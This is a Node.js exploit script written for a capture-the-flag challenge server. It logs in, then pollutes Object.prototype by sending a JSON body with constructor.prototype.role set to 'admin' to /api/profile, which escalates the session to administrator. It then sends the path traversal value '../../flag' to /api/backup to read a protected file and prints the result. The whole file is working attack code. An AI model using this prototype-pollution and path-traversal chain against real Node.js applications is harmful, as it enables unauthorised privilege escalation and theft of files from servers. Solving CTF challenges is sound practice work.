
const http = require('http');
const querystring = require('querystring');

// Use our last registered user
const uid = "524a8f8e4e344efebf0868c589c30b9b";

// Login first
const loginPost = querystring.stringify({ uid: uid });
const loginOpts = {
  hostname: '8080-3c5613b7-13e9-44c2-ab26-3b1ad1fa4904.challenge.ctfplus.cn',
  port: 80,
  path: '/login',
  method: 'POST',
  headers: {
    'Content-Type': 'application/x-www-form-urlencoded',
    'Content-Length': Buffer.byteLength(loginPost)
  }
};

console.log("Login...");
const loginReq = http.request(loginOpts, (res) => {
  const cookie = res.headers['set-cookie'].map(c => c.split(';')[0]).join('; ');
  console.log("Poisoning Object.prototype.role = 'admin' via /api/profile...");

  // This is it! Poison Object.prototype, so the session object (which is an Object) will inherit role=admin!
  const poisonData = JSON.stringify({
    "uid": uid,
    "constructor": {
      "prototype": {
        "role": "admin"
      }
    }
  });

  const poisonOpts = {
    hostname: '8080-3c5613b7-13e9-44c2-ab26-3b1ad1fa4904.challenge.ctfplus.cn',
    port: 80,
    path: '/api/profile',
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': Buffer.byteLength(poisonData),
      'Cookie': cookie
    }
  };

  const poisonReq = http.request(poisonOpts, (poisonRes) => {
    let body = '';
    poisonRes.on('data', chunk => body += chunk);
    poisonRes.on('end', () => {
      console.log("✅ Poisoning done! Now request backup, the session will inherit role=admin!");
      // Now request backup
      const backupPost = querystring.stringify({ file: '../../flag' });
      const backupOpts = {
        hostname: '8080-3c5613b7-13e9-44c2-ab26-3b1ad1fa4904.challenge.ctfplus.cn',
        port: 80,
        path: '/api/backup',
        method: 'POST',
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded',
          'Content-Length': Buffer.byteLength(backupPost),
          'Cookie': cookie
        }
      };

      const backupReq = http.request(backupOpts, (backupRes) => {
        let backupBody = '';
        backupRes.on('data', chunk => backupBody += chunk);
        backupRes.on('end', () => {
          console.log("\n🏁 FINAL RESULT:");
          console.log(backupBody);
        });
      });
      backupReq.write(backupPost);
      backupReq.end();
    });
  });
  poisonReq.write(poisonData);
  poisonReq.end();
});

loginReq.on('error', err => console.error(err));
loginReq.write(loginPost);
loginReq.end();
